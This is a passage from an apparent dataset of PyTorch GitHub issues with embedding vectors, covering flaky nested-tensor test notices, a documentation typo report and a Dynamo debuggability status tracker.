  0.03116272  0.65559185  0.15565573 -0.05527806 -0.12152309  0.41494238
 -0.16699849  0.03116287 -0.40279424 -0.09797787 -0.04510812 -0.04329015
 -0.07232313 -0.04433961 -0.09626961 -0.05639684 -0.26701453  0.04688232
 -0.21512929  0.20597893 -0.04263967  0.08369478 -0.08801688  0.07361355
  0.09768306  0.15499255 -0.06742977 -0.16646132  0.00680751  0.13262653]"
DISABLED test_nested_tensor_chunk_cpu_float16 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_nested_tensor_chunk_cpu_float16&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17886253401).

Over the past 3 hours, it has been determined flaky in 5 workflow(s) with 15 failures and 5 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_nested_tensor_chunk_cpu_float16`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-4.09032881e-01  5.93462586e-03 -3.11257482e-01 -9.23232660e-02
 -7.09530786e-02 -4.37101185e-01  1.53551400e-01  8.79642367e-02
 -2.52397627e-01 -3.38768601e-01  3.00713003e-01 -2.54504442e-01
  7.19809830e-02  5.97781017e-02 -1.09705124e-02 -5.31481951e-02
 -2.61165440e-01 -5.83139397e-02  4.00815159e-01  6.26192018e-02
 -1.84176996e-01 -4.89946604e-02 -4.19621676e-01  3.08315098e-01
  2.40986601e-01  7.52395615e-02 -1.13351107e-01 -1.04488336e-01
  2.57431656e-01  4.46083918e-02  4.65713620e-01  1.45487472e-01
 -2.52122521e-01  3.07758152e-03  4.59876686e-01  2.73395300e-01
 -1.68617383e-01 -1.15178153e-01 -2.39754558e-01 -1.53200716e-01
  3.07929516e-01  1.35458261e-01  8.49311501e-02 -2.60213614e-01
  2.67476439e-01  5.07195480e-02 -1.17244348e-01  2.05938444e-01
 -1.97608083e-01 -9.80400443e-02  8.70554745e-02 -1.37502402e-01
 -9.34293270e-02 -3.92135113e-01  3.77681889e-02 -2.30262771e-01
  2.12208271e-01  2.19466478e-01  7.25984573e-02  1.42925709e-01
 -5.15945479e-02 -1.18422285e-02  3.16818058e-03  6.06770255e-03
 -6.93290681e-02  3.88282090e-02  2.91345596e-01 -2.74713188e-01
  4.85526919e-01 -3.05354781e-02  3.09917629e-01 -5.76117635e-02
 -3.92748892e-01 -8.98039434e-03  1.97107390e-01  2.24343732e-01
 -1.44893929e-01  1.02026135e-01  1.13584697e-02  1.14879962e-02
 -3.54560524e-01 -2.84514576e-02  1.67967379e-01 -8.24013948e-02
  2.11654365e-01  3.22253443e-02  1.92557722e-01  6.90210611e-02
  1.62545845e-01 -2.65280366e-01  2.77058601e-01  3.62279266e-01
 -1.65385127e-01  5.62430210e-02 -7.15928227e-02 -6.15675822e-02
  3.82706106e-01 -1.24675095e-01 -3.49824309e-01  1.70504868e-01
  8.50965977e-02 -2.63189673e-01 -1.08026832e-01  4.27333653e-01
 -1.39493644e-01 -7.00151846e-02  3.59988630e-01 -6.47074431e-02
  6.03737980e-02 -1.20434396e-01  1.40685782e-01 -3.02732643e-03
  2.14673951e-01  2.35132039e-01  7.39889219e-02 -1.99165404e-01
 -1.82181507e-01 -3.77626270e-02  2.06828266e-02  6.04242384e-01
 -3.16768855e-01 -8.44998211e-02  2.42679361e-02  8.29598382e-02
  2.65945762e-01  1.17193453e-01 -7.44043589e-02  1.34888962e-02
  2.26891100e-01 -2.66704820e-02  4.86318842e-02  1.12164713e-01
 -3.34707946e-01 -7.89290965e-02  1.10487431e-01  6.13304153e-02
 -2.62406915e-01 -2.80203074e-01  1.41441226e-02 -5.44148535e-02
 -1.50541514e-01  1.69047132e-01  3.61736491e-03 -3.40086877e-01
  4.80956256e-01  5.54927923e-02 -1.91362083e-01  8.29707086e-02
 -1.53160781e-01  1.36654481e-01  3.33416685e-02  8.73536170e-02
  2.07951173e-01  3.70148629e-01 -1.36439223e-02  4.55065584e-03
  3.32294852e-01  1.40464783e-01 -5.85595444e-02 -2.43368104e-01
 -5.12015149e-02  4.62891102e-01 -9.66838375e-02  3.27301845e-02
  3.19013417e-01 -1.26061440e-01 -5.59134960e-01 -6.95933700e-02
  1.30040407e-01  1.59622788e-01 -9.05992910e-02 -1.60063412e-02
 -1.87347643e-03  8.91170278e-02  6.07915819e-02 -3.56540084e-04
  1.84470057e-01 -4.74203199e-01 -9.47585851e-02  2.61057258e-01
  8.65105763e-02 -8.17154795e-02  1.44416600e-01 -3.44742090e-02
 -8.38333517e-02  1.16007321e-01  2.56654203e-01 -1.14035845e-01
 -4.21552081e-03 -3.05387452e-02 -4.36212718e-01 -1.36055321e-01
  1.16830274e-01 -1.10764816e-01 -1.76420137e-01 -2.06884801e-01
  5.41883111e-02 -1.44286022e-01  5.80812208e-02  3.66786048e-02
 -2.02480897e-01  1.92461073e-01  1.66887268e-01 -1.20973632e-01
  1.91317976e-01 -9.21140015e-02 -1.56576231e-01 -3.51425469e-01
  1.20316781e-01  1.31783158e-01 -4.83539999e-02 -2.53592670e-01
 -2.44321540e-01 -2.49713838e-01  3.29415873e-02 -7.62405992e-02
  7.84261152e-02 -8.67715627e-02 -2.83319712e-01  1.78986460e-01
 -1.84881583e-01 -1.47175103e-01 -3.13693523e-01 -1.27555728e-01
 -4.39348638e-01 -2.09692523e-01 -1.77509844e-01  2.04289183e-01
 -5.45640215e-02  7.76383430e-02 -1.03851415e-01 -1.22255117e-01
  9.96222049e-02 -6.37438074e-02  3.10520798e-01 -3.86149406e-01
 -3.46328646e-01 -1.52750745e-01  4.50087711e-02  5.17597198e-01
 -5.10692954e-01 -4.91007775e-01 -6.82398975e-02  8.73937607e-02
 -2.77431123e-02  8.38203356e-03  5.34846112e-02  6.32461067e-03
 -1.98020309e-01  2.01487541e-01 -1.61481008e-01 -3.18345457e-01
  2.64352202e-01  4.96115834e-02  2.01829478e-01  3.10326904e-01
 -5.86349033e-02  5.69522046e-02 -1.51869785e-02 -3.00979726e-02
  7.75233060e-02  2.26320803e-01 -1.93439126e-01  3.51247787e-01
  9.83657464e-02  2.13213980e-01 -2.99057871e-01  2.65470713e-01
  1.02437377e-01 -1.43080145e-01  4.20343399e-01 -2.59113997e-01
  3.82210463e-02  7.07147084e-03  1.42734617e-01 -2.15740323e-01
  4.11438137e-01  3.77881587e-01 -1.47062078e-01 -2.26089850e-01
  2.50006557e-01  1.12848274e-01 -2.11998016e-01 -9.95354876e-02
  4.66825813e-02 -3.54166538e-01 -1.76432684e-01 -1.81773543e-01
 -1.86489135e-01 -5.43272234e-02 -1.81782782e-01  1.99696153e-01
  7.34003410e-02 -3.48187424e-03 -4.23592478e-01  4.48518842e-02
  4.13348138e-01 -1.81147173e-01 -1.28058065e-02 -1.12329714e-01
 -1.25632241e-01 -7.03676268e-02  1.63564861e-01 -3.08807075e-01
  9.80418697e-02 -8.68851840e-02  2.41043150e-01  3.71767730e-02
  3.58436793e-01 -3.14723551e-01  2.11051434e-01  1.13979325e-01
 -9.98130739e-02  2.82000452e-01  5.11799753e-03 -5.13285734e-02
 -5.77927381e-02  5.34212112e-01  2.07357705e-01  1.38672352e-01
  3.54465425e-01 -2.24240065e-01 -2.86345899e-01  1.21601552e-01
  9.17326733e-02 -1.34336591e-01 -3.18348646e-01 -1.91789985e-01
 -1.17452227e-01 -3.37987803e-02 -1.58787534e-01 -2.64114439e-01
 -1.65365264e-01 -1.75271392e-01 -4.95236740e-02 -1.22744225e-01
 -1.20814212e-01  4.66528416e-01 -1.05711333e-02 -1.89451158e-01
  1.11996517e-01 -1.29628569e-01  1.74011678e-01 -4.49535251e-01
 -1.69104531e-01 -1.82538465e-01  2.87224233e-01  1.75863072e-01
  1.60252243e-01  1.12936407e-01 -9.17510539e-02  7.99965486e-02
 -1.64122403e-01 -3.82263027e-02  2.16152310e-01  4.63283539e-01
 -5.57466857e-02  1.05087802e-01  2.88768679e-01  5.62412620e-01
 -2.79980481e-01  1.23117156e-02 -3.34576309e-01 -3.58586311e-01
  2.82369077e-01 -1.63661122e-01 -1.01938821e-01 -9.01688635e-02
  1.21581405e-01  3.98874819e-01 -4.06705052e-01  3.60265553e-01
 -8.89723301e-02  3.86954665e-01  1.62446141e-01 -5.90773970e-02
  1.18841074e-01 -8.85171592e-02  3.61551978e-02 -1.18344024e-01
  5.57437092e-02  7.30042160e-02  5.30932993e-02  1.45783231e-01]"
There is a repeated expression and the wrong word  ,"### ðŸ“š The doc issue


> this page: <https://pytorch.org/tutorials/prototype/prototype_index.html>



<img width=""844"" alt=""image"" src=""https://github.com/pytorch/pytorch/assets/9199175/2e0fb141-32e8-41a0-995f-b128617f99ae"">


### Suggest a potential alternative/fix

_No response_",False,"[-0.3120131   0.20527664 -0.1871437  -0.04757458 -0.00431928 -0.37915403
  0.03430605 -0.00525893 -0.16444618 -0.16667002  0.21643668  0.24909365
  0.18732266  0.05432697  0.22591624  0.2945225  -0.15634297  0.37869233
 -0.2984908   0.18954672  0.31881806 -0.10692968 -0.02258968 -0.07808695
 -0.18346299  0.12103738 -0.111046   -0.07539681 -0.187619   -0.18540305
  0.59400344  0.01314865 -0.23494802 -0.21268044  0.4212817   0.19661471
 -0.19720191 -0.10099277  0.2821231  -0.02222022 -0.1703271   0.03997328
  0.1581329  -0.10332747 -0.22826037 -0.11874805 -0.13491502  0.06731337
  0.07850774 -0.26383144 -0.09104393 -0.54430807 -0.33396766 -0.43153697
  0.23060885 -0.13567355  0.00793556 -0.42357278 -0.00610816 -0.17614123
  0.28485033  0.046872    0.09186395  0.10298874  0.04875442  0.2306011
 -0.29012036 -0.16444017  0.18429199  0.05234846  0.5199492   0.17504023
 -0.16295505 -0.11616543  0.3943473  -0.17815223 -0.20317712  0.27201423
  0.00994129  0.03865996 -0.06450079 -0.3999621  -0.18185656 -0.18501835
 -0.17554027  0.2041811   0.20355019  0.18326488  0.3837164  -0.2190732
 -0.00471036 -0.3959685  -0.02436745 -0.12930058  0.400835    0.30352265
 -0.17292696 -0.24905358 -0.21868172 -0.24813956 -0.459184   -0.35151887
 -0.16511375 -0.2234971  -0.06381928 -0.2087715  -0.24898556  0.10232599
  0.2642153  -0.04330815 -0.21599828 -0.06941595 -0.12680218  0.24158448
 -0.27968234 -0.16999744  0.23506078 -0.26392367 -0.31628764  0.23230776
  0.3507362  -0.00609829  0.13156492  0.30720508  0.14335763 -0.09749968
 -0.40726086  0.21438733 -0.04940315  0.30941558  0.18498603 -0.07599175
  0.4142968  -0.05249942  0.1971041  -0.21257615 -0.31524515 -0.25154033
 -0.21457227 -0.13230932 -0.34071338  0.28172266 -0.08966939 -0.345505
 -0.18677668  0.01250541 -0.23772034 -0.0350283   0.01633064 -0.08303741
 -0.17315544 -0.0807578   0.06761993  0.457656    0.03333948  0.00904526
  0.16409326 -0.10325404  0.10226432 -0.02947639 -0.21655093  0.26650903
  0.14624415 -0.00568987  0.22331655 -0.15189472 -0.24580161 -0.02822652
  0.15261039  0.307141   -0.09927456  0.27579796  0.09764359 -0.04935278
  0.23436038  0.03707234 -0.14984837 -0.3345977  -0.21171895  0.45772773
  0.43309686 -0.04863834  0.07145201 -0.27399772 -0.17579526  0.14967239
  0.14828326 -0.10954986  0.04351285 -0.34134707 -0.17152824  0.09399773
 -0.07068794 -0.2224139  -0.10477942  0.03069566  0.18048024  0.36900735
  0.0295704   0.26049024  0.0133868  -0.14174157 -0.20823872 -0.20521522
  0.12054081  0.19619034  0.01935149 -0.23077963 -0.03629569  0.11114112
 -0.2775246  -0.00988563 -0.17405055  0.30386055 -0.16892092  0.14643463
 -0.12210134  0.18216445  0.1418101   0.12270277 -0.05197179 -0.13944376
 -0.37527937 -0.4201271   0.05081362 -0.00709502 -0.2645301  -0.03453907
  0.1430796  -0.15449974  0.21525252 -0.29085353  0.3658329  -0.13371769
 -0.10021149  0.38429558 -0.232682   -0.18160278 -0.0255356  -0.00250495
  0.28017986 -0.02288227 -0.04063417 -0.0919091  -0.02000966  0.19255787
 -0.2037156   0.07984912  0.09465087  0.24930573  0.04251544 -0.20964313
  0.20428208 -0.01717564  0.02950756 -0.00562794  0.3870187   0.28065592
  0.02076345 -0.17214403  0.2103409   0.04226033  0.30522233  0.02122872
  0.20304146 -0.02878714 -0.2572365   0.17942694 -0.10042248 -0.16286641
  0.36650616 -0.25178382  0.4707163  -0.07459578  0.31678268 -0.24190329
  0.02392836 -0.40453506 -0.21710289 -0.19633274 -0.09986719 -0.27512228
  0.22496597  0.4321475   0.12856323 -0.20120129  0.26252812 -0.08858894
 -0.36177307 -0.05890812 -0.47862893  0.21822433 -0.06168278  0.05945515
  0.19385445  0.22111675 -0.01298693  0.14253767  0.01235827  0.21310899
 -0.04835624  0.03101161  0.3385166  -0.37408388 -0.66907597  0.08901132
 -0.13927275  0.00994863  0.491131   -0.28906894 -0.19969237  0.04945207
 -0.10950956  0.16261426 -0.20765331  0.28406924 -0.15608767  0.63518083
  0.02879285  0.11542144  0.18807942 -0.09246799 -0.01843919  0.12980862
  0.02056124  0.05507357  0.02374168 -0.32015386  0.32726002 -0.27558213
 -0.24750875  0.01848734  0.17403392  0.2683001  -0.20430681  0.13618524
 -0.20258814  0.22987571 -0.03971717 -0.05820682 -0.09624341 -0.02154259
  0.1125236  -0.00244615 -0.41589323 -0.2792033   0.14727935  0.5317855
 -0.16993615  0.21230133  0.1605615   0.35393775 -0.25608575  0.23942819
  0.00263671  0.29477698  0.10804448  0.29466197  0.16263713  0.3803473
  0.09145156 -0.18553552 -0.26342225  0.40233746  0.08170646  0.19193868
  0.04247439 -0.3164484  -0.05489331  0.18527828  0.08184893  0.11633729
 -0.08821048  0.13662824  0.17782423 -0.07319111  0.15155666  0.02502078
  0.2105735  -0.06191307  0.3751278   0.07550816  0.31610936  0.15480739]"
Status Tracker And Summary of Support Needed: Make Dynamo Generated Artifacts Debuggable triaged oncall: pt2,"Currently, dynamically translated bytecode from Dynamo can only be run as a black box. With the help of recent tools like https://github.com/thuml/depyf , it is possible to decompile bytecode into source code, and to enable debugging tools to debug those generated bytecodes.

This issue (status tracker) ducoments the progress and support needed from PyTorch side to fulfill the goal.

# General idea:

PyTorch generate bytecode (and many other artifacts) dynamically. We can decompile and dump the source code into files, let users set breakpoints, and re-run the program to hit those breakpoints.

# Main difficulty:

In essence, artifacts (transformed bytecode, compiled functions, etc.) are generated **dynamically**. We need to have a stable naming for each artifact so that users can recognize them and reuse them across runs.

# Some minor concerns:

Some function names in Dynamo are not valid (notoriously, the resume functions have `<resume in xxx>` name). We need to assign valid names for them.

# Example usage:

The main usage come from the `depyf` side. The rough idea is to set up a src directory, and dump src there for debugging.

```diff
+ import depyf
+ # set up a hook to dump src of dynamically generated artifacts
+ depyf.enable_torch_compile_debugging(dump_dir=""/path/to/dumped/src"")
def toy_example(a, b):
    x = a / (torch.abs(a) + 1)
    if b.sum() < 0:
        b = b * -1
    return x * b

for _ in range(100):
    toy_example(torch.randn(10), torch.randn(10))
```

The ideal result looks like this:

![image](https://github.com/pytorch/pytorch/assets/23236638/8f586170-7745-4cf6-9950-2d16fe831a46)

```[tasklist]
### Tasks
- [x] make code name of resume functions valid, finished in https://github.com/pytorch/pytorch/pull/111635 .
```


cc @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-0.4012399  -0.06402849 -0.35259685 -0.39260113  0.13917522 -0.0893457
 -0.15665627 -0.0338983  -0.3651498   0.07241625 -0.037907   -0.02831221
  0.27085373 -0.16915926 -0.00632922  0.11191919  0.09783055  0.15502954
  0.03039365 -0.09265459 -0.09912238  0.21480128 -0.06927401  0.09015128
  0.131988    0.08218002 -0.19499278 -0.0798382   0.35460058 -0.05768947
  0.31255484  0.03633234 -0.2958669   0.09757351  0.21663281  0.32182616
  0.02368907  0.08051468 -0.09142146 -0.19275843  0.05259079  0.18369736
 -0.06909105 -0.06859992  0.12866162 -0.07117889 -0.05806256  0.21267821
 -0.44477266 -0.03725971  0.1606511   0.20660597 -0.07421435 -0.12896925
 -0.00895203 -0.02076038 -0.00411665  0.15756296 -0.14680052 -0.08740023
  0.05528071 -0.03356954  0.00880877 -0.19182643  0.03719734  0.10553133
 -0.00854143 -0.0218839   0.402737   -0.08786546 -0.03624707 -0.13010359
 -0.2879738  -0.31885278 -0.00545487  0.32127482 -0.14606941  0.21103078
 -0.14245896 -0.36553615  0.09553852  0.31328458  0.21949112 -0.09378867
  0.21423513  0.09311404  0.03144081  0.12519318  0.11594456  0.0651529
  0.254932   -0.02270228  0.28760213 -0.06676417  0.11660904  0.30652273
  0.00652709 -0.04605209  0.41174775  0.00438525 -0.20853244 -0.37027672
 -0.44174463  0.13733506  0.06145196 -0.19890372  0.08830545  0.3509339
  0.22350632 -0.24888039  0.252212   -0.01057366 -0.21321619  0.18331379
  0.24555294  0.0459073   0.03212321 -0.16485842 -0.04827957 -0.03420077
  0.18332946 -0.07112233  0.0571526   0.05972922  0.228987    0.00330377
  0.12395287 -0.20260145  0.26624775  0.32826224  0.12407104  0.08751118
 -0.03223098 -0.01097079  0.04561188 -0.05637851  0.04152713 -0.09340201
 -0.15300798 -0.10925999 -0.19265068  0.10524715  0.14678305 -0.12624072
 -0.10437717 -0.05543378 -0.0554366   0.20082164  0.17666313 -0.09623501
 -0.09473939 -0.30069315 -0.06510144  0.47265744  0.30609995  0.18796122
  0.09686483  0.02700758 -0.01039387 -0.36572245  0.11308411  0.260745
  0.11827093 -0.09242566 -0.15580308  0.15920767 -0.3026343   0.06292149
  0.05885658  0.10656616 -0.239351   -0.11643578  0.10790302 -0.11917852
  0.36859798 -0.02937901 -0.15950635 -0.22707966  0.18067184  0.36372572
 -0.12409912 -0.05534352  0.24916768  0.02017488 -0.02243754 -0.03462391
  0.3639433   0.07524841 -0.12322053  0.15251467 -0.08157298 -0.03555598
  0.20556219 -0.28014618 -0.07532944 -0.19206494 -0.11964313  0.12865034
 -0.0963534   0.01704915  0.11995769 -0.05917743 -0.03327796  0.03163509
 -0.10497288  0.22351696 -0.18532589 -0.0009701  -0.36069077  0.27931497
 -0.19981402 -0.25175196  0.36953825 -0.13126084  0.01341097 -0.17300913
 -0.27671283 -0.38833183  0.07902241  0.2570827  -0.08694133 -0.30579162
 -0.28866526 -0.07184639 -0.13083616  0.32700735 -0.26943755  0.18801987
 -0.23150435 -0.02551639 -0.2664206  -0.00325006  0.2815553   0.17199585
  0.04804338  0.15278459 -0.01009456 -0.31662962 -0.31665084  0.00902735
 -0.24127306 -0.09641761 -0.2577291  -0.09320363 -0.16505086  0.01173984
 -0.14338161 -0.13811783 -0.05349255  0.15930742  0.03404247 -0.1322742
  0.07431582 -0.11722343  0.09990069  0.13785353 -0.33722687 -0.08791512
  0.04630903  0.03142726  0.07385734  0.20543787 -0.17607468  0.22100458
  0.21412057  0.2123824  -0.26813203  0.22535399 -0.2451946  -0.20612952
 -0.03185856 -0.07610352  0.07578591  0.25804836  0.4999553  -0.12950148
  0.3220013  -0.08570313  0.02310481 -0.02737785  0.02340462  0.33353597
 -0.02001902  0.0982686  -0.02069606 -0.302507   -0.1775358   0.01269618
 -0.18139601 -0.11629402 -0.15852848  0.28333405 -0.10167166  0.03318404
 -0.1368196  -0.01943732  0.20334992  0.06723312 -0.03458408 -0.09948694
 -0.25103465  0.04953296  0.1431534   0.12284882 -0.0778041  -0.00280393
  0.3045746  -0.16001953  0.7547461  -0.33166367 -0.11116322  0.20978528
 -0.080025    0.09658615 -0.12743269  0.17513481 -0.4173214   0.6457648
  0.21456683  0.19940226 -0.11405652 -0.04761959 -0.45351854 -0.11951301
  0.02009353  0.21915053 -0.14932108 -0.05162026  0.02576116  0.04461453
  0.16970667 -0.23855928 -0.3743356   0.15239066 -0.19956388  0.0390529
  0.22152346 -0.00541443  0.02859375 -0.25809896 -0.06873764 -0.06579366
 -0.07436488 -0.121338   -0.16903733 -0.00238549  0.0936324   0.2984525
  0.16177651 -0.16478671 -0.05087391  0.02011935 -0.08844246 -0.09873706
 -0.15141098  0.20804279 -0.078293    0.12037259  0.00246913  0.46381128
 -0.11385542  0.12751192 -0.26584858 -0.23972821  0.07419182 -0.14696482
 -0.02885235 -0.1741738  -0.13186824  0.11703515 -0.15925321  0.16147786
 -0.02291448  0.29408944  0.31529754  0.02296804 -0.00839106 -0.29083508
 -0.0268525   0.11854952 -0.4259143   0.25706792  0.00105759 -0.27406156]"
DISABLED test_narrow_cpu_float64 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

This test was disabled because it is failing in CI. See [recent examples](https://hud.pytorch.org/flakytest?name=test_narrow_cpu_float64&suite=TestNestedTensorDeviceTypeCPU) and the most recent trunk [workflow logs](https://github.com/pytorch/pytorch/runs/17880663159).

Over the past 3 hours, it has been determined flaky in 4 workflow(s) with 12 failures and 4 successes.

**Debugging instructions (after clicking on the recent samples link):**
DO NOT ASSUME THINGS ARE OKAY IF THE CI IS GREEN. We now shield flaky tests from developers so CI will thus be green but it will be harder to parse the logs.
To find relevant log snippets:
1. Click on the workflow logs linked above
2. Click on the Test step of the job so that it is expanded. Otherwise, the grepping will not work.
3. Grep for `test_narrow_cpu_float64`
4. There should be several instances run (as flaky tests are rerun in CI) from which you can study the logs.


Test file path: `test_nestedtensor.py`

cc @cpuhrsch @jbschlosser @bhosmer @drisspg @soulitzer @ezyang @msaroufim @wconstab @bdhirsh @anijain2305 @zou3519",False,"[-3.45856577e-01  6.49055094e-02 -1.58337086e-01 -9.66734439e-02
 -7.68655092e-02 -3.78144264e-01 -3.30381840e-02  1.35054186e-01
 -3.62137109e-01 -1.75722793e-01  3.28329086e-01 -5.06632105e-02
  2.69326985e-01  1.06603667e-01 -1.76618267e-02 -1.09341808e-01
 -1.34181038e-01 -9.67197567e-02  4.08363938e-01  1.44718885e-01
 -2.14649260e-01 -8.55265185e-04 -2.96423823e-01  1.87724382e-01
  1.96005717e-01 -2.41544433e-02 -1.73361406e-01 -5.27686253e-02
  9.06863138e-02  9.25130397e-02  2.05430433e-01  1.29132107e-01
 -2.78130889e-01 -2.96915397e-02  5.05570769e-01  2.02189475e-01
 -9.06311423e-02 -1.04389563e-01 -2.97262281e-01 -1.28649533e-01
  2.32622504e-01  4.12784144e-03 -1.90117247e-02 -1.22637160e-01
  2.08995402e-01 -1.01578943e-02 -1.73079461e-01  2.19462693e-01
 -2.50751138e-01 -5.59646189e-02  9.62448418e-02 -1.01964533e-01
  2.15819664e-02 -3.47537220e-01  1.89481471e-02 -1.96594954e-01
  1.05300084e-01  3.40892196e-01  1.01561353e-01  2.00007051e-01
  1.09104007e-01  7.02439062e-03 -5.35342433e-02 -7.06400052e-02
 -1.12358518e-02  5.90752140e-02  2.02573076e-01 -2.77030140e-01
  5.23080587e-01 -7.22407699e-02  1.35132834e-01 -6.12784587e-02
 -3.09159428e-01 -2.63994932e-03  1.68669701e-01  2.09026515e-01
 -2.79312342e-01  8.33878070e-02 -3.29279453e-02 -2.25291122e-02
 -9.48683396e-02 -5.06936759e-02 -3.11583327e-03  4.58697528e-02
  1.67243749e-01  3.30334529e-02  1.28358126e-01 -1.09662171e-02
  2.16817066e-01 -2.46012688e-01  1.62996531e-01  2.42403209e-01
 -2.16072172e-01  2.28655245e-03 -1.36833563e-01 -8.79536867e-02
  3.53369117e-01 -1.62176281e-01 -4.31859195e-01  2.02695206e-01
  1.83471471e-01 -4.18098480e-01 -1.38361707e-01  2.95087457e-01
 -1.25111520e-01 -2.62009680e-01  4.37956452e-01  4.69007343e-02
  9.12445784e-02 -1.99637115e-01  1.41146451e-01  2.11433414e-02
 -3.25379893e-04  5.09246923e-02  7.49952942e-02 -7.26268142e-02
 -1.50813460e-01 -1.19001575e-01 -4.78077158e-02  5.28917015e-01
 -2.78609931e-01 -1.45752847e-01  3.90240178e-02 -6.54946864e-02
  3.09895098e-01  5.69854155e-02 -1.26781762e-01  3.64852436e-02
  1.93045974e-01  2.25368775e-02  1.25036370e-02  1.19205527e-01
 -2.63383806e-01 -7.81616643e-02  8.55678618e-02  9.12100375e-02
 -1.15516469e-01 -2.20088601e-01  4.87909243e-02  4.70418185e-02
 -1.68299779e-01  1.18470654e-01  6.86242282e-02 -2.78524965e-01
  2.22342461e-01  8.00603181e-02 -1.51900947e-01  8.27625096e-02
 -1.41787887e-01  3.70324366e-02  6.87287003e-03  6.03143275e-02
  3.18119735e-01  3.77833128e-01 -8.27345252e-03 -5.97188324e-02
  3.82619798e-01  1.48457944e-01  7.77132213e-02 -9.85558927e-02
 -5.81814498e-02  4.44875091e-01 -1.13811292e-01  5.60518168e-02
  2.80089587e-01 -1.53465614e-01 -4.63880956e-01  8.73891078e-03
  2.52564177e-02  1.34734869e-01 -1.17631957e-01 -6.40561879e-02
  1.38428554e-01 -1.14879653e-01 -6.22617230e-02 -6.30267933e-02
  2.84577310e-01 -3.63990396e-01 -2.48134360e-02  2.43828818e-01
  3.46942469e-02  1.68356523e-02  2.00116873e-01  1.58298075e-01
 -4.54405919e-02  1.44297913e-01  1.67795166e-01 -9.17491987e-02
  7.04248250e-02 -1.52506113e-01 -4.97348845e-01 -2.29916126e-01
  6.96294606e-02 -3.89067680e-02 -2.40869448e-01 -2.97576129e-01
  2.84250714e-02 -8.92828405e-02 -2.20491104e-02  2.27095019e-02
 -1.15504265e-01  3.68950307e-01  2.72981584e-01 -6.84279427e-02
  4.09472883e-02  1.35624111e-01 -2.16092706e-01 -4.31833982e-01
  1.50945932e-01  5.69227785e-02 -1.77492857e-01 -3.65227945e-02
 -1.59172863e-01 -3.53363931e-01  1.17656523e-02  3.12309694e-02
 -6.24749102e-02 -5.83478026e-02 -2.54974551e-02  2.36166373e-01
 -3.04323256e-01 -1.25274673e-01 -2.82138228e-01 -1.29639804e-01
 -4.00592744e-01 -7.80448765e-02 -1.61491275e-01  2.79331863e-01
 -3.52566913e-02  6.16590772e-03 -3.98949459e-02 -2.44460493e-01
  1.69768140e-01  1.67786703e-03  3.49728853e-01 -2.68263906e-01
 -3.14660013e-01 -5.74638657e-02 -6.29171962e-03  4.89372849e-01
 -4.90902781e-01 -5.44533134e-01 -9.22644287e-02  9.72884297e-02
  3.86629552e-02  9.21409205e-03  2.50081308e-02 -4.69007157e-02
 -1.52278021e-01  1.13810964e-01 -1.37302205e-01 -3.30271840e-01
  1.56422436e-01 -2.49938946e-03  1.25198573e-01  4.02417809e-01
 -1.00389123e-01  1.02190323e-01  3.72532420e-02 -3.58612314e-02
  3.90649736e-02  3.79280955e-01 -1.40606135e-01  2.80807257e-01
  1.91387326e-01  1.18475020e-01 -1.52359873e-01  6.02506846e-02
  2.36521810e-02 -2.15977773e-01  5.38876653e-01 -4.91778314e-01
  3.39654237e-02  1.56138822e-01  2.74882346e-01 -2.52001166e-01
  3.77629995e-01  1.98944330e-01 -3.10827121e-02 -1.52609900e-01
  1.57936454e-01  8.09906125e-02 -9.71613750e-02 -1.48045912e-01
  1.64226517e-01 -2.92661428e-01 -1.41191021e-01 -1.03836387e-01
 -2.30749696e-01 -1.00558311e-01 -4.26790938e-02  2.00469971e-01
  7.67707732e-03  6.26149476e-02 -3.68888736e-01 -1.67747606e-02
  3.68580699e-01 -2.53372461e-01  1.61617801e-01 -1.67652622e-01
 -1.06987543e-01 -9.34948474e-02  8.47112685e-02 -3.25282276e-01
  1.86267048e-02 -5.74993491e-02  7.64946938e-02 -3.16223018e-02
  4.25715208e-01 -3.06104034e-01  6.96073845e-02  2.80965269e-01
 -6.89496472e-02  2.96896398e-01 -4.91665863e-03  6.75165057e-02
 -2.60565281e-01  2.70841479e-01  1.16122942e-02  2.21634239e-01
  3.31604540e-01 -1.48067147e-01 -3.70789707e-01  8.53129923e-02
  1.80051029e-01  4.80316579e-02 -3.54335725e-01 -7.51467347e-02
 -8.81522745e-02  2.76529510e-02 -8.70924592e-02 -1.23694301e-01
 -2.00089842e-01 -2.02525973e-01  4.27726135e-02 -1.10733844e-01
 -1.31140023e-01  4.37019467e-01  2.63099913e-02 -2.03497320e-01
  8.16330090e-02 -9.12854970e-02  5.30784540e-02 -2.58914232e-01
 -9.32712257e-02 -6.14148043e-02  1.86638385e-01  2.15313211e-01
  2.25972950e-01  1.18160158e-01 -1.24387614e-01  8.60087499e-02
 -2.16870993e-01 -1.46236181e-01  3.52745429e-02  5.30082464e-01
  1.41162544e-01  1.03804089e-01  3.50285888e-01  5.29604733e-01
 -2.21991569e-01 -3.87663953e-02 -3.52496088e-01 -2.76887149e-01
  2.13154644e-01 -9.25394893e-02 -6.56854659e-02 -2.83912085e-02
  3.88831422e-02  3.05171192e-01 -4.13021326e-01  2.02272490e-01
 -1.09454885e-01  3.08374107e-01  1.34656325e-01 -8.20962489e-02
  1.92598000e-01 -2.09524632e-01 -1.77846402e-02 -5.31411264e-03
 -1.47229046e-01  1.70739353e-01  4.22885120e-02  2.14208722e-01]"
DISABLED test_narrow_cpu_float32 (__main__.TestNestedTensorDeviceTypeCPU) triaged module: flaky-tests module: nestedtensor skipped oncall: pt2,"Platforms: dynamo

